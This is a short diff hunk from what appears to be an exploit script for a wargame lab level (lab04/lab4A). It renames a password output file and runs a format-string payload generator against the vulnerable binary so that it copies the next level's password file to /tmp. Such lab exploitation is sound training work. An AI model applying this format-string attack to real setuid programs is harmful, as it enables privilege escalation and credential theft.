@@ -134,7 +134,7 @@ print buf
 
 EOF
 
-passfile="/tmp/lab4A.pass"
+passfile="/tmp/lab4Aend.pass"
 
 echo "cat /home/lab4end/.pass > $passfile" | /levels/lab04/lab4A $(python /tmp/.fmtgen.py $stackaddr $shelladdr)
 echo Password stored in $passfile
